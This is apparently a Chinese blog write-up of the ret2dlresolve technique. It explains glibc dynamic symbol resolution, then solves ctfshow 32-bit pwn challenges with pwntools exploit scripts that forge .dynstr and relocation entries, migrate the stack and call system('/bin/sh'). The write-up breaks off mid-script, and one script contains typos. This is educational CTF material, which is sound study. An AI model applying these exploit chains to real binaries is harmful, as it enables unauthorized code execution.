__builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))  </span><br><span class="line">        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    <span class="comment">//最后将value写回到got表中   </span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只关注主要函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(<span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 然后通过reloc-&gt;r_info(0x607)找到.dynsym中对应的条目 （.dynsym+0x10*6)</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址（.dynstr_addrs+0x4c）</span></span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以write为例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过link_map找到对应的</span><br></pre></td></tr></table></figure>

<p>简单来说，在解释对应函数地址是根据对应符号名字符串来解析的，如果控制了符号名字符串，那么可以在不泄露libc的情况下实现解析任何函数</p>
<blockquote>
<h3 id="rel-plt-段的结构"><a href="#rel-plt-段的结构" class="headerlink" title=".rel.plt 段的结构"></a><code>.rel.plt</code> 段的结构</h3><p><code>.rel.plt</code> 段中的每个重定位条目通常包含以下信息：</p>
<ul>
<li><strong>偏移量（Offset）</strong> ：表示在 <code>.plt</code> 段或 <code>.got.plt</code> 段中的偏移地址，用于指示需要重定位的数据位置。</li>
<li><strong>信息（Info）</strong> ：包含符号表索引和类型信息，用于确定重定位的目标符号（如函数名）和重定位类型。</li>
<li><strong>类型（Type）</strong> ：在 ELF 文件中，重定位类型用于指定重定位的操作方式。对于 <code>.rel.plt</code> 段，通常使用 <code>R_386_JMP_SLOT</code> 类型（在 32 位 x86 架构中），表示这是一个跳转槽（JMP_SLOT）重定位，用于填充 <code>.got.plt</code> 表中的地址。</li>
<li><strong>符号表索引（Symbol Table Index）</strong> ：用于在动态符号表（<code>.dynsym</code>）中查找对应的符号（如函数名），从而获取函数的实际地址。</li>
</ul>
</blockquote>
<h1 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h1><p>思路 1 - 直接控制重定位表项的相关内容<br>由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法是直接修改动态字符串表 .dynstr，比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串。但是，动态字符串表和代码映射在一起，是只读的。此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。</p>
<p>但是，假如我们可以控制程序执行流，那我们就可以伪造合适的重定位偏移，从而达到调用目标函数的目的。然而，这种方法比较麻烦，因为我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。</p>
<p>思路 2 - 间接控制重定位表项的相关内容<br>既然动态链接器会从 .dynamic 节中索引到各个目标节，那如果我们可以修改动态节中的内容使得最后动态链接器解析的符号是我们想要解析的符号，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的。</p>
<p>思路 3 - 伪造 link_map<br>由于动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。</p>
<h1 id="实例分析："><a href="#实例分析：" class="headerlink" title="实例分析："></a>实例分析：</h1><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="NO-RELRO下的情况"><a href="#NO-RELRO下的情况" class="headerlink" title="NO_RELRO下的情况"></a>NO_RELRO下的情况</h3><p>ctfshow-pwn-32</p>
<p>check</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>NO_RELRO下的情况下.dynamic节是可写的我们直接修改.dynamic的strtab将其指向我们构造的.dynstr表</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-59-51.png" alt="1"></p>
<p>正常的.dynstr表找该表可以搜aread</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_16-02-24.png" alt="1"></p>
<p>将read替换为system使得在调用read时执行system</p>
<p>具体思路：利用read在bss段上部署新的.dynstr表，其中将read的符号的名字改为system，接着修改.dynamic的strtab将其指向bss段的新.dynstr表，传入&#x2F;bin&#x2F;sh最后调用read函数的plt[2]执行<code>system(&#39;/bin/sh&#39;)</code></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28296)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./1.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">Elf32_Dyn_strtab = <span class="number">0x08049804</span></span><br><span class="line">bss = <span class="number">0x080498E0</span></span><br><span class="line">read_plt_first = <span class="number">0x08048376</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,Elf32_Dyn_strtab+<span class="number">4</span>,<span class="number">4</span>) <span class="comment">#将动态段中的动态字符串表（dynstr）指针修改为特定位置。</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line"><span class="comment">#新表中read被替换为了system</span></span><br><span class="line">rop.read(<span class="number">0</span>,bss,<span class="built_in">len</span>((dynstr)))</span><br><span class="line">rop.read(<span class="number">0</span>,bss+<span class="number">0x100</span>,<span class="built_in">len</span>(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">rop.raw(read_plt_first) <span class="comment">#第一次调用read时plt表跳转到的地址也就是push一个数字然后jmp到了plt[0]处,找该位置可以IDA动调，在执行被调函数前plt表上jmp的地址即为该地址</span></span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop.raw(bss+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line"><span class="comment">#检查构造的 ROP 链长度是否小于等于 256 字节。这是因为漏洞程序可能对输入的缓冲区大小有限制，确保 payload 不会超出限制。</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="comment">#如果 ROP 链长度不足 256 字节，则用 a 字符填充到 256 字节，使 payload 的大小符合预期。</span></span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(p32(bss))</span><br><span class="line">io.send(dynstr)</span><br><span class="line">io.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Partial-RELRO手工伪造"><a href="#Partial-RELRO手工伪造" class="headerlink" title="Partial RELRO手工伪造"></a>Partial RELRO手工伪造</h3><p>1.控制<code>eip</code>为PLT[0]的地址，只需传递一个<code>index_arg</code>(0x20)参数<br>2.控制<code>index_arg</code>的大小，使<code>reloc</code>(base_stage+0x24)的位置落在可控地址内<br>3.伪造<code>reloc</code>的内容，使<code>sym</code>落在可控地址内<br>4.伪造<code>sym</code>的内容，使<code>name</code>落在可控地址内<br>5.伪造<code>name</code>为任意库函数，如<code>system</code></p>
<p>ctfshow-pwn-83</p>
<p>check</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>开启Partial RELRO后.dynamic不可写了刚刚这种做法就不太好完成了这时我们可以通过伪造重定位表项的方式来调用目标函数。</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_20-53-54.png" alt="1"></p>
<p>有两种方式一种是手工伪造，这种方法比较麻烦但是可以仔细理解ret2dlresolve的原理，另一种是用工具来实现攻击比较方便</p>
<p>题目函数和溢出点没变</p>
<p>为进一步理解利用原理，选择跟着wiki一步步手工伪造</p>
<h4 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h4><p>在这一阶段，我们的目的比较简单，就是控制程序直接执行 write 函数。在栈溢出的情况下，我们其实可以直接控制返回地址来控制程序直接执行 write 函数。但是这里我们采用一个相对复杂点的办法，即先使用栈迁移，将栈迁移到 bss 段，然后再来控制 write 函数。因此，这一阶段主要包括两步</p>
<ol>
<li>将栈迁移到 bss 段。</li>
<li>通过 write 函数的 plt 表项来执行 write 函数，输出相应字符串。</li>
</ol>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stag = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*0ffset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bin_sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">rop.write(<span class="number">1</span>,base_stage+<span class="number">80</span>,<span class="built_in">len</span>(bin_sh))</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(bin_sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>程序正常输出了<code>/bin/sh\x00</code></p>
<h4 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h4><p>在这一阶段，进一步利用_dl_runtime_resolve相关知识来控制程序执行write函数</p>
<ol>
<li>将栈迁移到 bss 段。</li>
<li>控制程序直接执行 plt[0] 中的相关指令，即 push linkmap 以及跳转到 <code>_dl_runtime_resolve</code> 函数。这时，我们还需要提供 write 重定位项在 got 表中的偏移。这里，我们可以直接使用 write plt 中提供的偏移，即 0x080483C6 处所给出的 0x20。其实，我们也可以跳转到 0x080483C6 地址处，利用原有的指令来提供 write 函数的偏移，并跳转到 plt[0]。</li>
</ol>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_21-54-57.png" alt="1"></p>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">jmprel_data = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).data()</span><br><span class="line">writegot = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_reloc_offset = jmprel_data.find(p32(writegot,endian=<span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(write_reloc_offset) <span class="comment">#0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_reloc_offset))</span><br><span class="line"><span class="comment">#前两个也可以换为rop.raw(loc_80483A6_addrs)</span></span><br><span class="line">rop.raw(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage+<span class="number">80</span>)</span><br><span class="line">sh = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">100</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line"></span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.plt:080483C6 loc_80483C6:</span><br><span class="line">.plt:080483C6                 push    20h ; &#x27; &#x27;</span><br><span class="line">.plt:080483CB                 jmp     sub_8048370</span><br></pre></td></tr></table></figure>

<p>exp中plt0实际存放的地址对应的汇编是<code>push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</code></p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_22-11-26.png" alt="1"></p>
<p>此时凑齐<code>_dl_runtime_resolve</code>函数的两个参数也就是</p>
<p><code>_dl_runtime_resolve（linkmap,reloc_offset）</code></p>
<p>程序正常输出了<code>/bin/sh\x00</code></p>
<h4 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h4><p>这一次，我们同样控制 <code>_dl_runtime_resolve</code> 函数中的 reloc_offset 参数，不过这次控制其指向我们伪造的 write 重定位项，也就是控制<code>index_offset</code>，使其指向我们构造的<code>fake_reloc</code></p>
<p>鉴于 pwntools 本身并不支持对重定位表项的信息的获取。这里我们手动看一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">桌面$ readelf -r pwn</span><br><span class="line"></span><br><span class="line">重定位节 <span class="string">&#x27;.rel.dyn&#x27;</span> at offset 0x30c contains 3 entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">08049ff4  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line">08049ff8  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0</span><br><span class="line">08049ffc  00000806 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0</span><br><span class="line"></span><br><span class="line">重定位节 <span class="string">&#x27;.rel.plt&#x27;</span> at offset 0x324 contains 5 entries:</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   <span class="built_in">read</span>@GLIBC_2.0</span><br><span class="line">0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br><span class="line">0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>

<p>可以看出write的重定位表项的<code>reloc_offset  = 0x0804a01c</code> ，<code>reloc_info = 0x00000607</code></p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_09-45-40.png" alt="1"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">got0 = elf.get_section_by_name(<span class="string">&#x27;.got&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr <span class="comment">#节头地址</span></span><br><span class="line"><span class="comment"># make base_stage+24 ---&gt; fake reloc</span></span><br><span class="line">write_reloc_offset = base_stage+<span class="number">24</span>-rel_plt </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">r_info = <span class="number">0x607</span></span><br><span class="line"></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(write_reloc_offset)</span><br><span class="line"></span><br><span class="line">rop.raw(<span 